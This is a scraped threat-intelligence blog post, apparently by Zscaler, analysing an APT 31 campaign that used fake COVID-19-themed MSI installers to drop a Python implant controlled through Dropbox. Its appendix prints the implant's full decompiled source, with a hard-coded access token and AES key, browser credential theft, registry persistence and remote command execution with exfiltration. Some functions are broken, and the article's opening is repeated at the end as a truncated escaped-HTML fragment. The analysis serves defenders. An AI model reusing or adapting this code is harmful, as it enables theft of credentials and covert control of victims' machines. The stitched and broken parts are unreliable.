class="sidebar_link___4reK" rel="noopener" href="#more-blogs">More blogs</a></li></ol></div><div class="sidebar_copyUrlWrapper__n99w0  hidden lg:flex" style="border-bottom:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div><div class="sidebar_copyUrlWrapper__n99w0 flex lg:hidden" style="border-bottom:none;border-top:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div></div></div></div></div></div></div></div><div class="hidden lg:block" style="margin-bottom:-0px"></div><div class="" id="article"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><p>Recently, Zscaler&#x27;s ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled GitHub accounts and distributed in-the-wild in August 2020. These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.</p>

<p>After further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the Chinese state-sponsored threat actor APT 31. In this blog, we will share details of the attack flow, threat attribution, correlation between various instances of attacks by this threat actor, and an in-depth technical analysis of the payloads involved. We will conclude our analysis by sharing indicators of compromise (IOCs), useful metadata, and the complete decompiled Python script, which was the main payload involved in these attacks.</p>

<p> </p>

<h3><strong>Distribution strategy</strong></h3>

<p>The threat actor in this case leverages legitimate online services end-to-end in the infection chain in order to blend in with benign traffic and evade network security controls.</p>

<p>The infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader. As we found in our analysis, this first-stage downloader is responsible for fetching a malicious MSI file hosted on an attacker-controlled GitHub page. This MSI file is downloaded and executed on the endpoint. As a result, a malicious Python-compiled binary is dropped on the file system, which uses the Dropbox API for command-and-control (C&amp;C) communication. Based on the metadata of the dropped binary, we observed that attackers were spoofing legitimate application names related to popular online services such as Microsoft OneDrive.</p>

<p>While we did not obtain the first-stage downloader for this attack, we were able to reconstruct the attack flow based on the tactics, techniques, and procedures (TTPs) used by this threat actor in the past with a similar attack flow.</p>

<p>Figure 1 shows the entire reconstructed attack flow.</p>

<p><img alt="Attack_Flow" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/attack_flow2.001.jpeg" loading="lazy" decoding="async"/></p>

<p><em>Figure 1: Reconstructed entire attack flow</em></p>

<p>To make the attack more convincing, attackers leveraged a social engineering technique by displaying decoy content to the user. This decoy content, as we describe in the later sections of the blog, is related to themes of interest for the targeted victims.</p>

<p> </p>

<h3><strong>Threat attribution</strong></h3>

<p>We correlated all the instances of attacks described in this blog to the same threat actor based on the following indicators.</p>

<ul>
	<li>The attack flow is similar in all cases.</li>
	<li>The use of legitimate attacker-controlled GitHub accounts to host malicious MSI files with spoofed file extensions.</li>
	<li>The use of Dropbox API for command-and-control (C&amp;C) communication.</li>
	<li>The MSI wrapper used to convert the EXE to MSI file format.</li>
	<li>PyInstaller used to compile the Python script to the final payload.</li>
	<li>Decompiled Python script using the same AES encryption key and sharing of code base.</li>
	<li>The name of artifacts such as Windows Run registry key used to create persistence on the machine.</li>
</ul>

<p>In October 2020, Google’s Threat Analysis Group (TAG) attributed an attack using a similar payload to APT-31 in its report <a href="https://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats">here</a>. While Google’s report did not share any technical analysis details for the payload, we were able to correlate the codebase to the Python-compiled binary highlighted by them. All the indicators mentioned above were shared by the samples in our report.</p>

<p>Upon further research, we discovered a <a href="https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/">report</a> of an attack using Hong Kong pro-democracy protest themes in October 2019. There is considerable overlap between the malware distribution strategy and the payload indicators in this report and the samples we discovered.</p>

<p>Therefore, we can confidently attribute the attack discussed in this blog to APT-31.<br/>
 </p>

<h3><strong>Technical analysis</strong></h3>

<p>Since there are multiple stages involved in the infection chain, we will describe each component in detail in this section.</p>

<p> </p>

<h3><strong>MSI file</strong></h3>

<p>For the purpose of technical analysis, we will consider the MSI file with MD5 hash: <strong>f3896d4a29b4a2ea14ea8a7e2e500ee5</strong></p>

<p>MSI is an installer package file format used by Microsoft Windows. Microsoft Windows provides an <em>msiexec</em> utility that provides the means to install, modify, and perform operations on MSI files.</p>

<p>The threat actor in this case hosted the MSI file on GitHub using a spoofed file extension to look like a PDF. Due to the use of this fake file extension (*.pdf) and the intel we gathered about this threat actor from previous tactics, techniques, and procedures (TTPs) in the <a href="https://redalert.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activists/">report</a>, we concluded that there was a first-stage payload involved that was used to fetch the MSI file from GitHub and execute it using the msiexec.exe command-line utility.</p>

<p>In this threat actor&#x27;s 2019 activity, an LNK file was used to fetch the MSI binary from GitHub and execute it using the following command line:</p>

<p><em>C:\Windows\System32\msiexec.exe  /q /i <github_url></github_url></em></p>

<p>It is worth noting that in 2019, this actor used a fake file extension (*.png) for the MSI binary hosted on the attacker-controlled GitHub account.</p>

<p>Based on this similarity, we are confident that a first-stage payload was involved that downloads and executes the MSI files.</p>

<p>All the MSI files were created using <a href="https://www.exemsi.com">MSI Wrapper</a> software, which helps to convert an executable file to an MSI file. With an MSI Wrapper, you can include other files in the same MSI package and execute them along with the main executable.</p>

<p>Figure 6 shows the MSI Wrapper flash screen displayed to the user upon execution.</p>

<p><img alt="MSI_Wrapper" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/MSI_wrapper.png" loading="lazy" decoding="async"/></p>

<p><em>Figure 6: MSI Wrapper flash screen displayed to the user.</em></p>

<p> </p>

<p>Upon execution, the MSI binary drops and executes the main payload, which is a python-compiled binary and also opens the dropped decoy PDF file which is displayed to the user.<br/>
 </p>

<h3><strong>Python-compiled binary</strong></h3>

<p>The MSI file described above will drop a Python-compiled binary in the Appdata\Roaming directory, which is used to perform further malicious activities.</p>

<p><strong>MD5 hash</strong>: bd26122b29ece6ce5abafb593ff7b096</p>

<p><strong>Filename</strong>: OneDrive.exe</p>

<p>For the purpose of social engineering, the threat actor chose file names related to legitimate online services, including Microsoft OneDrive. In a few instances, we observed the use of file names resembling McAfee’s endpoint security product. Even the file icons for these binaries are selected to masquerade as the corresponding legitimate applications. </p>

<p>Since this binary used the PyInstaller packager to compile the Python script to a standalone executable, we can extract the compiled Python script (*.pyc) from this package and use a decompiling tool such as uncomplye6 to decompile its contents.</p>

<p>The complete decompiled script is included in Appendix I.</p>

<p>Below are some of the key functionalities of the binary.</p>

<p><strong>1. Check and use the proxy configuration: </strong>Check if the proxy is configured using registry value “ProxyEnable” which is located under registry key “Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings”. If successful then the proxy server information is obtained using the registry value “ProxyServer” under the same registry key. Later this proxy server is used for all the C&amp;C communication.</p>

<p><strong>2. Browser credential stealing</strong>: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and Google Chrome browser.<br/>
<br/>
Figures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.</p>

<p><img alt="ie_credentials" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/ie_credentials.png" loading="lazy" decoding="async"/></p>

<p><em>Figure 7: Code section used to steal MSIE credentials.</em></p>

<p><img alt="chrome_credentials" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/chrome_credentials.png" loading="lazy" decoding="async"/></p>

<p><em>Figure 8: Code section used to steal Chrome browser credentials.</em></p>

<p><strong>3. Persistence</strong>: Creates a Windows RUN registry key for persistence. The name of the key is: &quot;Dropbox Update Setup&quot;. This name was consistent in all the samples. This key points to the location of the Python-compiled binary in the %appdata% directory to ensure that it is started automatically each time the system is rebooted.</p>

<p>4. <strong>Bot identifier generation</strong>: Generates a unique ID (uuid) for the machine, which is used to register the bot with the attacker&#x27;s C&amp;C server.</p>

<p>uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))</p>

<p>5. <strong>Registration of bot</strong>: Collects the following information from the machine to register the bot with the C&amp;C server.</p>

<p>System information - Details of processor architecture.</p>

<p>Current timestamp - Format: %Y-%m-%d %H:%M:%S</p>

<p>System name</p>

<p>Username of the machine</p>

<p>Collects this information in JSON format, AES encrypts it and sends it to the attacker&#x27;s server using Dropbox API.</p>

<p>6. <strong>Command-and-control activities</strong>: After registering the bot with attacker&#x27;s server, it will check for new jobs by querying the Dropbox API endpoint: https://api.dropboxapi.com/2/files/job</p>

<p>There are three main commands supported in the script:</p>

<p>a) upload</p>

<p>b) download</p>

<p>c) cmd: A system command which needs to be executed on the endpoint. Python script will execute this using subprocess.Popen()</p>

<p>The results will be stored in a JSON format, AES-encrypted and sent as an attachment using the Dropbox API.</p>

<p>JSON format: {u&#x27;sys&#x27;: getSysinfo(), u&#x27;date&#x27;: getdate(), u&#x27;pcname&#x27;: getComputername(), u&#x27;user&#x27;: getUser(), u&#x27;file&#x27;: self.attachment, u&#x27;msg&#x27;: self.text}</p>

<p>Here, text indicates the output of the command executed on the endpoint.</p>

<p>The filename format used is: back#<unique_id>#<job_id>#.txt</job_id></unique_id></p>

<p> </p>

<h3><strong>Zscaler Cloud Sandbox detection</strong></h3>

<p>Figure 9 shows the sandbox detection for the final payload which is a Python-compiled binary.</p>

<p><img alt="sandbox_detection" data-entity-type="" data-entity-uuid="" src="https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/sandbox_detection.png" loading="lazy" decoding="async"/></p>

<p><em>Figure 9: Zscaler Cloud Sandbox detection.</em></p>

<p> </p>

<h3><strong>Conclusion</strong></h3>

<p>The threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines. By abusing legitimate services such as GitHub, Google Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions.</p>

<p>As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine. </p>

<p>The Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.</p>

<p> </p>

<p><strong>Appendix 1</strong></p>

<p> </p>

<p><strong>Python decompiled code</strong></p>

<p> </p>

<p># The decompiled Python code is consistent among all the samples. The only change we observed was in the access token. Even the AES encryption key is shared between all the samples.</p>

<p> </p>

<p>import requests, json, win32cred, sqlite3, win32crypt, subprocess, sys, os, threading, time, platform, uuid, base64, time</p>

<p>from Crypto import Random</p>

<p>from Crypto.Cipher import AES</p>

<p>from _winreg import *</p>

<p>time.sleep(480)</p>

<p>access_token = &#x27;XAdmrYKoIiAAAAAAAAAADSEB3W3JCY6-pc1tD0zTp2upliDsO9vNrjfjIDJae_Ii&#x27;</p>

<p>api_url = &#x27;https://api.dropboxapi.com/2/files/&#x27;</p>

<p>content_url = &#x27;https://content.dropboxapi.com/2/files/&#x27;</p>

<p>respath = &#x27;/res&#x27;</p>

<p>jobpath = &#x27;/job&#x27;</p>

<p>respath_s = &#x27;/res/&#x27;</p>

<p>jobpath_s = &#x27;/job/&#x27;</p>

<p>proxies = {}</p>

<p>uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))</p>

<p>BS = 16</p>

<p>pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</p>

<p>unpad = lambda s: s[0:-ord(s[(-1)])]</p>

<p> </p>

<p>class AESCipher:</p>

<p> </p>

<p>    def __init__(self):</p>

<p>        self.key = &#x27;ApmcJue1570368JnxBdGetr*^#ajLsOw&#x27;</p>

<p> </p>

<p>    def encrypt(self, raw):</p>

<p>        raw = pad(raw)</p>

<p>        iv = Random.new().read(AES.block_size)</p>

<p>        cipher = AES.new(self.key, AES.MODE_CBC, iv)</p>

<p>        return base64.b64encode(iv + cipher.encrypt(raw))</p>

<p> </p>

<p>    def decrypt(self, enc):</p>

<p>        enc = base64.b64decode(enc)</p>

<p>        iv = enc[:16]</p>

<p>        cipher = AES.new(self.key, AES.MODE_CBC, iv)</p>

<p>        return unpad(cipher.decrypt(enc[16:]))</p>

<p> </p>

<p> </p>

<p>aesciper = AESCipher()</p>

<p> </p>

<p>class regthread(threading.Thread):</p>

<p> </p>

<p>    def __init__(self):</p>

<p>        threading.Thread.__init__(self)</p>

<p>        self.tempdir = os.getenv(&#x27;AppData&#x27;)</p>

<p>        self.fileName = sys.argv[0]</p>

<p>        self.regpath = os.path.join(self.tempdir, os.path.basename(self.fileName))</p>

<p>        self.runs = &#x27;Software\\Microsoft\\Windows\\CurrentVersion\\Run&#x27;</p>

<p>        self.services = &#x27;Dropbox Update Setup&#x27;</p>

<p>        self.daemon = False</p>

<p>        self.start()</p>

<p> </p>

<p>    def run(self):</p>

<p>        os.popen(&#x27;copy %s %s /y&#x27; % (self.fileName, self.tempdir))</p>

<p>        key = OpenKey(HKEY_CURRENT_USER, self.runs)</p>

<p>        while True:</p>

<p>            runkey = []</p>

<p>            try:</p>

<p>                i = 0</p>

<p>                while True:</p>

<p>                    subkey = EnumValue(key, i)</p>

<p>                    runkey.append(subkey[0])</p>

<p>                    i += 1</p>

<p> </p>

<p>            except Exception as e:</p>

<p>                pass</p>

<p> </p>

<p>            if self.services not in runkey:</p>

<p>                time.sleep(10)</p>

<p>                try:</p>

<p>                    key = OpenKey(HKEY_CURRENT_USER, self.runs, 0, KEY_ALL_ACCESS)</p>

<p>                    SetValueEx(key, self.services, 0, REG_SZ, self.regpath)</p>

<p>                    key.Close()</p>

<p>                except Exception as e:</p>

<p>                    pass</p>

<p> </p>

<p>            time.sleep(10)</p>

<p> </p>

<p>def get_proxyserver():</p>

<p>    try:</p>

<p>        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)</p>

<p>        aKey = OpenKey(aReg, &#x27;Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&#x27;)</p>

<p>        subCount, valueCount, lastModified = QueryInfoKey(aKey)</p>

<p>        for i in range(valueCount):</p>

<p>            n, v, t = EnumValue(aKey, i)</p>

<p>            if n == &#x27;ProxyServer&#x27;:</p>

<p>                if &#x27;;&#x27; in v:</p>

<p>                    slist = v.split(&#x27;;&#x27;)</p>

<p>                    for i in slist:</p>

<p>                        if &#x27;http=&#x27; in i:</p>

<p>                            server = i.split(&#x27;=&#x27;)[1]</p>

<p>                        else:</p>

<p>                            server = &#x27;&#x27;</p>

<p> </p>

<p>                elif &#x27;=&#x27; in v:</p>

<p>                    server = v.split(&#x27;=&#x27;)[1]</p>

<p>                else:</p>

<p>                    server = v</p>

<p> </p>

<p>        CloseKey(aKey)</p>

<p>        return server</p>

<p>    except Exception as e:</p>

<p>        return &#x27;&#x27;</p>

<p> </p>

<p>    return</p>

<p> </p>

<p> </p>

<p>def check_proxy():</p>

<p>    try:</p>

<p>        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)</p>

<p>        aKey = OpenKey(aReg, &#x27;Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&#x27;)</p>

<p>        subCount, valueCount, lastModified = QueryInfoKey(aKey)</p>

<p>        for i in range(valueCount):</p>

<p>            n, v, t = EnumValue(aKey, i)</p>

<p>            if n == &#x27;ProxyEnable&#x27;:</p>

<p>                isproxy = v</p>

<p> </p>

<p>        CloseKey(aKey)</p>

<p>        return isproxy</p>

<p>    except Exception as e:</p>

<p>        return 0</p>

<p> </p>

<p>    return</p>

<p>def get_ie_creds(server):</p>

<p>    proxycreds = []</p>

<p>    if &#x27;:&#x27; in server:</p>

<p>        server = server.split(&#x27;:&#x27;)[0]</p>

<p>    try:</p>

<p>        creds = win32cred.CredEnumerate(None, 1)</p>

<p>        for i in creds:</p>

<p>            if server in i[&#x27;TargetName&#x27;]:</p>

<p>                user = i[&#x27;UserName&#x27;]</p>

<p>                passwd = i[&#x27;CredentialBlob&#x27;].replace(&#x27;\x00&#x27;, &#x27;&#x27;)</p>

<p>                dic = {user: passwd}</p>

<p>                proxycreds.append(dic)</p>

<p> </p>

<p>        return proxycreds</p>

<p>    except Exception as e:</p>

<p>        return proxycreds</p>

<p> </p>

<p>    return</p>

<p> </p>

<p>def get_chrome_creds(server):</p>

<p>    path = os.getenv(&#x27;APPDATA&#x27;) + &#x27;\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data&#x27;</p>

<p>    creds = []</p>

<p>    if &#x27;:&#x27; in server:</p>

<p>        server = server.split(&#x27;:&#x27;)[0]</p>

<p>    try:</p>

<p>        conn = sqlite3.connect(path)</p>

<p>        cursor = conn.cursor()</p>

<p>        cursor.execute(&#x27;SELECT action_url, username_value, password_value FROM logins&#x27;)</p>

<p>        data = cursor.fetchall()</p>

<p>        if len(data) &gt; 0:</p>

<p>            for result in data:</p>

<p>                if result[0] == server:</p>

<p>                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]</p>

<p>                    if password:</p>

<p>                        dic = {result[1]: password}</p>

<p>                        creds.append(dic)</p>

<p> </p>

<p>        return creds</p>

<p>    except Exception as e:</p>

<p>        return creds</p>

<p> </p>

<p>    return</p>

<p> </p>

<p>def check_cred(server, creds):</p>

<p>    global proxies</p>

<p>    pro = {}</p>

<p>    url = &#x27;https://www.dropbox.com&#x27;</p>

<p>    if server:</p>

<p>        if creds:</p>

<p>            for userdic in creds:</p>

<p>                for user in userdic:</p>

<p>                    pro[&#x27;http&#x27;] = &#x27;http://&#x27; + user + &#x27;:&#x27; + userdic[user] + &#x27;@&#x27; + server</p>

<p>                    pro[&#x27;https&#x27;] = &#x27;https://&#x27; + user + &#x27;:&#x27; + userdic[user] + &#x27;@&#x27; + server</p>

<p>                    r = requests.get(url, proxies=pro)</p>

<p>                    if r.status_code == 200:</p>

<p>                        proxies = pro</p>

<p>                        return 1</p>

<p> </p>

<p>        else:</p>

<p>            pro[&#x27;http&#x27;] = &#x27;http://&#x27; + server</p>

<p>            pro[&#x27;https&#x27;] = &#x27;https://&#x27; + server</p>

<p>            r = requests.get(url, proxies=pro)</p>

<p>            if r.status_code == 200:</p>

<p>                proxies = pro</p>

<p>                return 1</p>

<p>    return 0</p>

<p> </p>

<p>def do_post(url, headers, data, proxy):</p>

<p>    if proxy:</p>

<p>        r = requests.post(url, headers=headers, data=data, proxies=proxies)</p>

<p>        if &#x27;download&#x27; in url:</p>

<p>            return r.content</p>

<p>        if &#x27;upload&#x27; in url:</p>

<p>            return r.content</p>

<p>        return json.loads(r.content)</p>

<p>    else:</p>

<p>        r = requests.post(url, headers=headers, data=data)</p>

<p>        if &#x27;download&#x27; in url:</p>

<p>            return r.content</p>

<p>        if &#x27;upload&#x27; in url:</p>

<p>            return r.content</p>

<p>        return json.loads(r.content)</p>

<p>def search(path, query, proxy):</p>

<p>    headers = {&#x27;Authorization&#x27;: &#x27;Bearer &#x27; + access_token,</p>

<p>       &#x27;Content-Type&#x27;: &#x27;application/json&#x27;}</p>

<p>    data = {&#x27;path&#x27;: path,</p>

<p>       &#x27;query&#x27;: query,</p>

<p>       &#x27;mode&#x27;: {&#x27;.tag&#x27;: &#x27;filename&#x27;}}</p>

<p>    r = do_post(api_url + &#x27;search&#x27;, headers, json.dumps(data), proxy)</p>

<p>    return r</p>

<p>def download(filepath, proxy):</p>

<p>       &#x27;Dropbox-API-Arg&#x27;: &#x27;{&quot;path&quot;:&quot;%s&quot;}&#x27; % filepath}</p>

<p>    r = do_post(content_url + &#x27;download&#x27;, headers, &#x27;&#x27;, proxy)</p>

<p>    return r</p>

<p>def upload(data, filepath, proxy):</p>

<p>    headers = {&#x27;Authorization&#x27;: &#x27;Bearer &#x27; + access_token,</p>

<p>       &#x27;Content-Type&#x27;: &#x27;application/octet-stream&#x27;,</p>

<p>       &#x27;Dropbox-API-Arg&#x27;: &#x27;{&quot;path&quot;:&quot;%s&quot;}&#x27; % filepath}</p>

<p>    r = do_post(content_url + &#x27;upload&#x27;, headers, data, proxy)</p>

<p>    return r</p>

<p>class Download(threading.Thread):</p>

<p> </p>

<p>    def __init__(self, jobid, filepath, proxy):</p>

<p>        threading.Thread.__init__(self)</p>

<p>        self.jobid = jobid</p>

<p>        self.filepath = filepath</p>

<p>        self.daemon = True</p>

<p>        self.proxy = proxy</p>

<p>        self.start()</p>

<p> </p>

<p>    def run(self):</p>

<p>        try:</p>

<p>            if os.path.exists(self.filepath) is True:</p>

<p>                Sendmsg({u&#x27;cmd&#x27;: u&#x27;download&#x27;, u&#x27;res&#x27;: u&#x27;Download file success...&#x27;}, self.proxy, self.jobid, self.filepath)</p>

<p>            else:</p>

<p>                Sendmsg({u&#x27;cmd&#x27;: u&#x27;download&#x27;, u&#x27;res&#x27;: u&#x27;Path to file invalid&#x27;}, self.proxy, self.jobid)</p>

<p>        except Exception as e:</p>

<p>            Sendmsg({u&#x27;cmd&#x27;: u&#x27;download&#x27;, u&#x27;res&#x27;: (u&#x27;Failed: {}&#x27;).format(e)}, self.proxy, self.jobid)</p>

<p> </p>

<p> </p>

<p>class Upload(threading.Thread):</p>

<p> </p>

<p>    def __init__(self, jobid, dest, attachment, proxy):</p>

<p>        threading.Thread.__init__(self)</p>

<p>        self.jobid = jobid</p>

<p>        self.dest = dest</p>

<p>        self.attachment = attachment</p>

<p>        self.daemon = True</p>

<p>        self.proxy = proxy</p>

<p>        self.start()</p>

<p> </p>

<p>    def run(self):</p>

<p>        try:</p>

<p>            file_content = download(jobpath_s + self.attachment, self.proxy)</p>

<p>            fopen = open(self.dest, &#x27;wb+&#x27;)</p>

<p>            fopen.write(file_content)</p>

<p>            fopen.close()</p>

<p>            Sendmsg({u&#x27;cmd&#x27;: u&#x27;upload&#x27;, u&#x27;res&#x27;: u&#x27;Upload file success ,saved to %s&#x27; % self.dest}, self.proxy, self.jobid)</p>

<p>        except Exception as e:</p>

<p>            Sendmsg({u&#x27;cmd&#x27;: u&#x27;upload&#x27;, u&#x27;res&#x27;: (u&#x27;Upload file Failed: {}&#x27;).format(e)}, self.proxy, self.jobid)</p>

<p> </p>

<p>class execCmd(threading.Thread):</p>

<p> </p>

<p>    def __init__(self, command, jobid, proxy):</p>

<p>        threading.Thread.__init__(self)</p>

<p>        self.command = command</p>

<p>        self.jobid = jobid</p>

<p>        self.daemon = True</p>

<p>        self.proxy = proxy</p>

<p>        self.start()</p>

<p> </p>

<p>    def run(self):</p>

<p>        try:</p>

<p>            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</p>

<p>            stdout_value = unicode(proc.stdout.read(), errors=&#x27;ignore&#x27;)</p>

<p>            stdout_value += unicode(proc.stderr.read(), errors=&#x27;ignore&#x27;)</p>

<p>            Sendmsg({&#x27;cmd&#x27;: self.command, &#x27;res&#x27;: stdout_value}, self.proxy, jobid=self.jobid)</p>

<p>        except Exception as e:</p>

<p>            pass</p>

<p>def uploadfiles(filename, proxy):</p>

<p>    try:</p>

<p>        if search(respath, os.path.basename(filename), proxy)[&#x27;matches&#x27;]:</p>

<p>            delete(respath_s + os.path.basename(filename), proxy)</p>

<p>        fopen = open(filename, &#x27;rb&#x27;).read()</p>

<p>        upload(fopen, respath_s + os.path.basename(filename), proxy)</p>

<p>    except Exception as e:</p>

<p>        pass</p>

<p> </p>

<p>def msgparse(path, proxy):</p>

<p>    try:</p>

<p>        msg = download(path, proxy)</p>

<p>        return json.loads(aesciper.decrypt(msg))</p>

<p>    except Exception as e:</p>

<p>        return False</p>

<p>class Sendmsg(threading.Thread):</p>

<p> </p>

<p>    def __init__(self, text, proxy, jobid=&#x27;&#x27;, attachment=&#x27;&#x27;):</p>

<p>        threading.Thread.__init__(self)</p>

<p>        self.text = text</p>

<p>        self.jobid = jobid</p>

<p>        self.attachment = attachment</p>

<p>        self.proxy = proxy</p>

<p>        self.daemon = True</p>

<p>        self.start()</p>

<p> </p>

<p>    def run(self):</p>

<p>        filename = uniqueid</p>

<p>        filename = (u&#x27;back#{}#{}#.txt&#x27;).format(uniqueid, self.jobid)</p>

<p>        file_content = json.dumps({u&#x27;sys&#x27;: getSysinfo(), u&#x27;date&#x27;: getdate(), u&#x27;pcname&#x27;: getComputername(), u&#x27;user&#x27;: getUser(), u&#x27;file&#x27;: self.attachment, u&#x27;msg&#x27;: self.text})</p>

<p>        if self.attachment:</p>

<p>            if os.path.exists(self.attachment) == True:</p>

<p>                file_content = json.dumps({u&#x27;sys&#x27;: getSysinfo(), u&#x27;date&#x27;: getdate(), u&#x27;pcname&#x27;: getComputername(), u&#x27;user&#x27;: getUser(), u&#x27;file&#x27;: os.path.basename(self.attachment), u&#x27;msg&#x27;: self.text})</p>

<p>                uploadfiles(self.attachment, self.proxy)</p>

<p>        while True:</p>

<p>            try:</p>

<p>                if search(respath, filename, self.proxy)[&#x27;matches&#x27;]:</p>

<p>                    delete(respath_s + filename, self.proxy)</p>

<p>                upload(aesciper.encrypt(file_content), respath_s + filename, self.proxy)</p>

<p>                break</p>

<p>            except Exception as e:</p>

<p>                time.sleep(10)</p>

<p> </p>

<p>def checkJobs(proxy):</p>

<p>    while True:</p>

<p>        try:</p>

<p>            joblist = search(jobpath, uniqueid, proxy)</p>

<p>            for job in joblist[&#x27;matches&#x27;]:</p>

<p>                msg = msgparse(job[&#x27;metadata&#x27;][&#x27;path_lower&#x27;], proxy)</p>

<p>                jobid = job[&#x27;metadata&#x27;][&#x27;path_lower&#x27;].split(&#x27;#&#x27;)[2]</p>

<p>                if msg:</p>

<p>                    cmd = msg[&#x27;cmd&#x27;]</p>

<p>                    arg = msg[&#x27;arg&#x27;]</p>

<p>                    if cmd == &#x27;download&#x27;:</p>

<p>                        Download(jobid, arg, proxy)</p>

<p>                    elif cmd == &#x27;upload&#x27;:</p>

<p>                        Upload(jobid, arg, msg[&#x27;file&#x27;], proxy)</p>

<p>                    elif cmd == &#x27;cmd&#x27;:</p>

<p>                        execCmd(arg, jobid, proxy)</p>

<p>                try:</p>

<p>                    delete(job[&#x27;metadata&#x27;][&#x27;path_lower&#x27;], proxy)</p>

<p>                except Exception as e:</p>

<p>                    pass</p>

<p> </p>

<p>            time.sleep(10)</p>

<p>        except Exception as e:</p>

<p>            time.sleep(10)</p>

<p> </p>

<p>def startbot(proxy):</p>

<p>    regthread()</p>

<p>    call_online(proxy)</p>

<p>    try:</p>

<p>        checkJobs(proxy)</p>

<p>    except Exception as e:</p>

<p>        pass</p>

<p>if __name__ == &#x27;__main__&#x27;:</p>

<p>    isproxy = check_proxy()</p>

<p>    if isproxy:</p>

<p>        try:</p>

<p>            server = get_proxyserver()</p>

<p>            ie_creds = get_ie_creds(server)</p>

<p>            if ie_creds:</p>

<p>                flag = check_cred(server, ie_creds)</p>

<p>                if flag:</p>

<p>                    startbot(isproxy)</p>

<p>                else:</p>

<p>                    startbot(not isproxy)</p>

<p>            else:</p>

<p>                chrome_creds = get_ie_creds(server)</p>

<p>                if chrome_creds:</p>

<p>                    flag = check_cred(server, chrome_creds)</p>

<p>                    if flag:</p>

<p>                        startbot(isproxy)</p>

<p>                    else:</p>

<p>                        startbot(not isproxy)</p>

<p>                else:</p>

<p>                    flag = check_cred(server, [])</p>

<p>                    if flag:</p>

<p>                        startbot(isproxy)</p>

<p>                    else:</p>

<p>                        startbot(not isproxy)</p>

<p>        except Exception as e:</p>

<p>            startbot(0)</p>

<p> </p>

<p>    else:</p>

<p>        startbot(isproxy)</p>

Zscaler's ThreatLabZ team discovered several malicious MSI installer binaries that were hosted on attacker-controlled GitHub accounts and distributed in-the-wild in August 2020. These MSI binaries dropped and displayed decoy content using a theme around a COVID-19 vaccine as a social engineering technique.\u003c/p\u003e\r\n\r\n\u003cp\u003eAfter further analysis of these MSI binaries, we gathered sufficient intel from the code base and attack flow to correlate it to the Chinese state-sponsored threat actor APT 31. In this blog, we will share details of the attack flow, threat attribution, correlation between various instances of attacks by this threat actor, and an in-depth technical analysis of the payloads involved. We will conclude our analysis by sharing indicators of compromise (IOCs), useful metadata, and the complete decompiled Python script, which was the main payload involved in these attacks.\u003c/p\u003e\r\n\r\n\u003cp\u003e \u003c/p\u003e\r\n\r\n\u003ch3\u003e\u003cstrong\u003eDistribution strategy\u003c/strong\u003e\u003c/h3\u003e\r\n\r\n\u003cp\u003eThe threat actor in this case leverages legitimate online services end-to-end in the infection chain in order to blend in with benign traffic and evade network security controls.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader. As we found in our analysis, this first-stage downloader is responsible for fetching a malicious MSI file hosted on an attacker-controlled GitHub page. This MSI file is downloaded and executed on the endpoint. As a result, a malicious Python-compiled binary is dropped on the file system, which uses the Dropbox API for command-and-control (C\u0026amp;C) communication. Based on the metadata of the dropped binary, we observed that attackers were spoofing legitimate application names related to popular online services such as Microsoft OneDrive.\u003c/p\u003e\r\n\r\n\u003cp\u003eWhile we did not obtain the first-stage downloader for this attack, we were able to reconstruct the attack flow based on the tactics, techniques, and procedures (TTPs) used by this threat actor in the past with a similar attack flow.\u003c/p\u003e\r\n\r\n\u003cp\u003eFigure 1 shows the entire reconstructed attack flow.\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cimg alt=\"Attack_Flow\" data-entity-type=\"\" data-entity-uuid=\"\" src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/attack_flow2.001.jpeg\" loading=\"lazy\" decoding=\"async\"\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cem\u003eFigure 1: Reconstructed entire attack flow\u003c/em\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003eTo make the attack more convincing, attackers leveraged a social engineering technique by displaying decoy content to the user. This decoy content, as we 